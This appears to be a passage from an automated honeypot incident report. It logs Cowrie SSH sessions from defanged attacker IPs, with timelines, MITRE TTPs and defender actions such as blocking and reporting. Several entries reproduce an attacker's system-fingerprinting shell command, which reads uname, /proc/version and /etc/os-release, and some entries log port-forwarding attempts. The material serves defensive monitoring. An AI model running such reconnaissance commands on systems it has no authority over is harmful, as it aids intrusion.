| `2026-08-05 13:14:24` | `cowrie.session.connect` |
| `2026-08-05 13:14:24` | `cowrie.client.version` |
| `2026-08-05 13:14:24` | `cowrie.client.kex` |
| `2026-08-05 13:14:25` | `cowrie.login.success` |
| `2026-08-05 13:14:26` | `cowrie.session.params` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.success` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:26` | `cowrie.command.input` |
| `2026-08-05 13:14:27` | `cowrie.log.closed` |
| `2026-08-05 13:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b79b7331b7c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:16 |
| **Last Seen** | 2026-08-05 13:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:16:01` | `cowrie.session.connect` |
| `2026-08-05 13:16:02` | `cowrie.client.version` |
| `2026-08-05 13:16:02` | `cowrie.client.kex` |
| `2026-08-05 13:16:03` | `cowrie.login.success` |
| `2026-08-05 13:16:04` | `cowrie.session.params` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.success` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.command.input` |
| `2026-08-05 13:16:04` | `cowrie.log.closed` |
| `2026-08-05 13:16:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51a7924cd01

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]23` |
| **First Seen** | 2026-08-05 13:16 |
| **Last Seen** | 2026-08-05 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:16:05` | `cowrie.session.connect` |
| `2026-08-05 13:16:05` | `cowrie.client.version` |
| `2026-08-05 13:16:06` | `cowrie.client.kex` |
| `2026-08-05 13:16:06` | `cowrie.login.success` |
| `2026-08-05 13:16:06` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:16:07` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]23` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f3eebfd356e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-05 13:16 |
| **Last Seen** | 2026-08-05 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:16:18` | `cowrie.session.connect` |
| `2026-08-05 13:16:18` | `cowrie.client.version` |
| `2026-08-05 13:16:18` | `cowrie.client.kex` |
| `2026-08-05 13:16:19` | `cowrie.login.success` |
| `2026-08-05 13:16:19` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:16:19` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4aa924554a

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
| **First Seen** | 2026-08-05 13:17 |
| **Last Seen** | 2026-08-05 13:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:17:15` | `cowrie.session.connect` |
| `2026-08-05 13:17:15` | `cowrie.client.version` |
| `2026-08-05 13:17:15` | `cowrie.client.kex` |
| `2026-08-05 13:17:16` | `cowrie.login.success` |
| `2026-08-05 13:17:16` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:17:17` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d8de4c04d9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:17 |
| **Last Seen** | 2026-08-05 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:17:41` | `cowrie.session.connect` |
| `2026-08-05 13:17:41` | `cowrie.client.version` |
| `2026-08-05 13:17:41` | `cowrie.client.kex` |
| `2026-08-05 13:17:42` | `cowrie.login.success` |
| `2026-08-05 13:17:43` | `cowrie.session.params` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.success` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.command.input` |
| `2026-08-05 13:17:43` | `cowrie.log.closed` |
| `2026-08-05 13:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ddf15438f29

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-05 13:18 |
| **Last Seen** | 2026-08-05 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:18:14` | `cowrie.session.connect` |
| `2026-08-05 13:18:14` | `cowrie.client.version` |
| `2026-08-05 13:18:14` | `cowrie.client.kex` |
| `2026-08-05 13:18:15` | `cowrie.login.success` |
| `2026-08-05 13:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1d06530afb

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-05 13:18 |
| **Last Seen** | 2026-08-05 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:18:14` | `cowrie.session.connect` |
| `2026-08-05 13:18:14` | `cowrie.client.version` |
| `2026-08-05 13:18:14` | `cowrie.client.kex` |
| `2026-08-05 13:18:15` | `cowrie.login.success` |
| `2026-08-05 13:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deb533bf2b3b

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-08-05 13:18 |
| **Last Seen** | 2026-08-05 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:18:28` | `cowrie.session.connect` |
| `2026-08-05 13:18:28` | `cowrie.client.version` |
| `2026-08-05 13:18:28` | `cowrie.client.kex` |
| `2026-08-05 13:18:28` | `cowrie.login.success` |
| `2026-08-05 13:18:28` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:18:29` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb8910d9a429

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]23` |
| **First Seen** | 2026-08-05 13:19 |
| **Last Seen** | 2026-08-05 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:19:12` | `cowrie.session.connect` |
| `2026-08-05 13:19:12` | `cowrie.client.version` |
| `2026-08-05 13:19:12` | `cowrie.client.kex` |
| `2026-08-05 13:19:13` | `cowrie.login.success` |
| `2026-08-05 13:19:13` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:19:13` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]23` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cbc9fb30b59

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:19 |
| **Last Seen** | 2026-08-05 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:19:22` | `cowrie.session.connect` |
| `2026-08-05 13:19:22` | `cowrie.client.version` |
| `2026-08-05 13:19:22` | `cowrie.client.kex` |
| `2026-08-05 13:19:23` | `cowrie.login.success` |
| `2026-08-05 13:19:24` | `cowrie.session.params` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.success` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.command.input` |
| `2026-08-05 13:19:24` | `cowrie.log.closed` |
| `2026-08-05 13:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7aeedd57dc1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:20 |
| **Last Seen** | 2026-08-05 13:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:20:51` | `cowrie.session.connect` |
| `2026-08-05 13:20:51` | `cowrie.client.version` |
| `2026-08-05 13:20:51` | `cowrie.client.kex` |
| `2026-08-05 13:20:52` | `cowrie.login.success` |
| `2026-08-05 13:20:53` | `cowrie.session.params` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.success` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.command.input` |
| `2026-08-05 13:20:53` | `cowrie.log.closed` |
| `2026-08-05 13:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88456bac8f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:22 |
| **Last Seen** | 2026-08-05 13:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:22:14` | `cowrie.session.connect` |
| `2026-08-05 13:22:14` | `cowrie.client.version` |
| `2026-08-05 13:22:14` | `cowrie.client.kex` |
| `2026-08-05 13:22:14` | `cowrie.login.success` |
| `2026-08-05 13:22:15` | `cowrie.session.params` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.success` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.command.input` |
| `2026-08-05 13:22:15` | `cowrie.log.closed` |
| `2026-08-05 13:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df08e4faeed7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:23 |
| **Last Seen** | 2026-08-05 13:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:23:38` | `cowrie.session.connect` |
| `2026-08-05 13:23:38` | `cowrie.client.version` |
| `2026-08-05 13:23:38` | `cowrie.client.kex` |
| `2026-08-05 13:23:39` | `cowrie.login.success` |
| `2026-08-05 13:23:39` | `cowrie.session.params` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:39` | `cowrie.command.success` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:39` | `cowrie.command.input` |
| `2026-08-05 13:23:40` | `cowrie.command.input` |
| `2026-08-05 13:23:40` | `cowrie.log.closed` |
| `2026-08-05 13:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0450e713f24e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:25 |
| **Last Seen** | 2026-08-05 13:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:25:06` | `cowrie.session.connect` |
| `2026-08-05 13:25:06` | `cowrie.client.version` |
| `2026-08-05 13:25:06` | `cowrie.client.kex` |
| `2026-08-05 13:25:07` | `cowrie.login.success` |
| `2026-08-05 13:25:07` | `cowrie.session.params` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.success` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.command.input` |
| `2026-08-05 13:25:07` | `cowrie.log.closed` |
| `2026-08-05 13:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3588bff98ac0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:26 |
| **Last Seen** | 2026-08-05 13:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:26:35` | `cowrie.session.connect` |
| `2026-08-05 13:26:35` | `cowrie.client.version` |
| `2026-08-05 13:26:35` | `cowrie.client.kex` |
| `2026-08-05 13:26:36` | `cowrie.login.success` |
| `2026-08-05 13:26:37` | `cowrie.session.params` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.success` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.command.input` |
| `2026-08-05 13:26:37` | `cowrie.log.closed` |
| `2026-08-05 13:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8efcfedd31e2

| Field | Detail |
|---|---|
| **Source IP** | `112.30.127[.]9` |
| **First Seen** | 2026-08-05 13:27 |
| **Last Seen** | 2026-08-05 13:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:27:41` | `cowrie.session.connect` |
| `2026-08-05 13:27:43` | `cowrie.client.version` |
| `2026-08-05 13:27:43` | `cowrie.client.kex` |
| `2026-08-05 13:27:47` | `cowrie.login.success` |
| `2026-08-05 13:27:48` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
